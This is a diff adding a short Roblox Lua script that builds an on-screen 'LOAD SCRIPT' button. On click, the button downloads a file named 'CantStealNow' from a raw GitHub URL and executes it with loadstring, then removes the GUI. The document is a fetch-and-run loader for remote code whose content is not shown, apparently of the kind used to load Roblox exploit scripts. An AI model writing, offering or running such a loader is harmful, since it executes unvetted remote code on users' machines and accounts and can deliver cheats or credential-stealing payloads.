@@ -1,0 +1,30 @@
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoaderGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+local button = Instance.new("TextButton")
+button.Name = "LoadButton"
+button.Size = UDim2.new(0, 200, 0, 100)
+button.Position = UDim2.new(0.5, -100, 0.5, -50)
+button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.SourceSansBold
+button.Text = "LOAD SCRIPT"
+button.BorderSizePixel = 0
+button.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = button
+
+button.MouseButton1Click:Connect(function()
+    spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DodoBallls/example-/refs/heads/main/CantStealNow"))()
+    end)
+    screenGui:Destroy()
+end)
